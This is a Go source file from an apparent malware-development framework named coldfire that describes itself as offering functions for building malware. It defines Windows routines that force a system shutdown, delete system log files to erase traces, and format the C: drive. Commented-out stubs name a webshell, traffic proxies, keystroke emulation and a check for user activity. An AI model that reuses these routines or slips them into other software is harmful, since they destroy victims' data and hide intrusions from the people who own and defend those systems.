// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"os"
)

func shutdown() error {
	c := "shutdown -s -t 60"
	_, err := cmdOut(c)

	return err
}

func clearLogs() error {
	os.Chdir("%windir%\\system32\\config")
	_, err := cmdOut("del *log /a /s /q /f")
	if err != nil {
		return err
	}

	return nil
}

func wipe() error {
	cmd := "format c: /fs:ntfs"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

// func dialog(message, title string) {
// 	zenity.Info(message, zenity.Title(title))
// }

// func SplitMultiSep(s string, seps []string) []string {
// 	f := func(c rune) bool {
// 		for _, sep := range seps {
// 			if c == sep { // what?
// 				return true
// 			}
// 		}
// 	}
// 	fields := strings.FieldsFunc(s, f)
// 	return fields
// }

/*

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
